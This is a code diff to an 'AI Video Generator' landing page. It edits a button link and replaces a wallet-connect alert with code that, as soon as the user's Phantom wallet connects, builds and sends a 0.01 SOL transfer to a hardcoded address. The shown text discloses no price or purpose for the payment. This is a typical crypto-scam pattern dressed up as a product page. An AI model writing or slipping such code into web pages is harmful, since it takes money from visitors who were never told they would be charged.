@@ -82,7 +82,7 @@
     <section class="hero">
         <h1>AI Video Generator</h1>
         <p>Transform your ideas into stunning AI-powered videos instantly!</p>
-        <a href="#start" class="cta-btn">Start Creating</a>
+        <a href="#features" class="cta-btn" id="start-btn">Start Creating</a>
     </section>
 
     <section id="features" class="features">
@@ -146,11 +146,18 @@
                 try {
                     await window.solana.connect();
                     const provider = window.solana;
-                    const transaction = new solanaWeb3.Transaction();
                     const recipient = "4HP5UEaWJYyR7E1NS6G8eQqgySNLC95HwLPcmUqChgjx";
-                    alert("Connected to Phantom Wallet! Now send SOL to: " + recipient);
+                    const transaction = new solanaWeb3.Transaction().add(
+                        solanaWeb3.SystemProgram.transfer({
+                            fromPubkey: provider.publicKey,
+                            toPubkey: new solanaWeb3.PublicKey(recipient),
+                            lamports: 10000000 // 0.01 SOL
+                        })
+                    );
+                    const { signature } = await provider.signAndSendTransaction(transaction);
+                    alert("Transaction Sent! Signature: " + signature);
                 } catch (error) {
-                    alert("Connection failed: " + error.message);
+                    alert("Transaction failed: " + error.message);
                 }
             } else {
                 alert("Phantom Wallet not found. Please install it.");
